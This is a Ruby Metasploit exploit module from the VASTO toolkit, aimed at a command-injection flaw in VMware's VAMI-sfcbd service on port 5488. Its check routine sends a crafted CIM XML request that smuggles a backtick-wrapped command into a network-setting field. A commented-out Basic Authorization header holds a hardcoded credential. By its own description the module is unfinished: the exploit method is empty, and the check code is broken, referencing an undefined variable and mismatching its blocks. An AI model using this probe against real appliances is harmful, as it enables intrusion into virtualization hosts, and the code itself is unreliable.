#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VMware VAMI-sfcbd remote command exec',
			'Description'    => %q{
					This module exploits an arbitrary command execution flaw in
				the vami-sfcbd module shipped with VMware Studio (and appliances built with it) and VMware Data Recovery.
		                 NOTE: this module is not working at the moment. The exploit code is there, but it has not yet been weaponized.
			},
 			'License'        => GPL_LICENSE,
			'Version'        => '0.1',

			'Privileged'     => false,
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'       => 512,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic telnet',
						}
				},
			'Targets'        =>
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(5488)
			], self.class)
	end

	def check
	  connect
	  begin
	    data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"<<
	    '<CIM CIMVERSION="2.0" DTDVERSION="2.0"><MESSAGE ID="7" PROTOCOLVERSION="1.0">'<<
	    '<SIMPLEREQ><METHODCALL NAME="SetStaticNetworkSetting"><LOCALINSTANCEPATH>'<<
	    '<LOCALNAMESPACEPATH><NAMESPACE NAME="root"/><NAMESPACE NAME="cimv2"/>'<<
	    '</LOCALNAMESPACEPATH><INSTANCENAME CLASSNAME="VAMI_NetworkSetting">'<<
	    '<KEYBINDING NAME="Name"><KEYVALUE VALUETYPE="string">`eth0`</KEYVALUE>'<<
	    '</KEYBINDING><KEYBINDING NAME="ServerName"><KEYVALUE VALUETYPE="string">'<<
	    '</KEYVALUE></KEYBINDING></INSTANCENAME></LOCALINSTANCEPATH>'<<
	    '<PARAMVALUE NAME="Address" PARAMTYPE="string"><VALUE>1.1.1.1</VALUE>'<<
	    '</PARAMVALUE><PARAMVALUE NAME="Gateway" PARAMTYPE="string">'<<
	    '<VALUE>1.1.1.1</VALUE></PARAMVALUE><PARAMVALUE NAME="SubnetMask" PARAMTYPE="string">'<<
	    '<VALUE>255.255.255.0</VALUE></PARAMVALUE></METHODCALL></SIMPLEREQ></MESSAGE></CIM>'

	    res = send_request_raw({
		    'uri'	  => "/cimom",
		    'method'  => 'POST',
		    'vhost' => ip,
		    'data'    => data,
		    'headers' =>
		    {
			    'Content-Type'	 => 'application/xml; charset="utf-8"',
			    'Content-Length' => data.length,
			    'CIMProtocolVersion' => '1.0',
			    'CIMOperation' => 'MethodCall',
			    'CIMObject' => '%72%6F%6F%74/%63%69%6D%762%3A%56%41%4D%49_%4E%65%74%77%6F%72%6B%53%65%74%74%69%6E%67.%4E%61%6D%65%3D%22%65%74%680%22%2C%53%65%72%76%65%72%4E%61%6D%65%3D%22%41%41%41%41%22',
			    'CIMMethod' => '%53%65%74%53%74%61%74%69%63%4E%65%74%77%6F%72%6B%53%65%74%74%69%6E%67'
#Authorization: Basic cm9vdDozMmFjNDYwOC0yZmU0LTQwZjQtODQ1ZC05YzY4ZTBmY2U4M2I=         
		    }
	    }, 25)

	    if (resp =~ /<VALUE>0<\/VALUE>/)
	    begin
		    print_status("Response: #{resp.strip}")
		    return Exploit::CheckCode::Vulnerable
	    end
	      return Exploit::CheckCode::Safe
	    end
	  end
	end

	def exploit
		#TBD
	end

end
	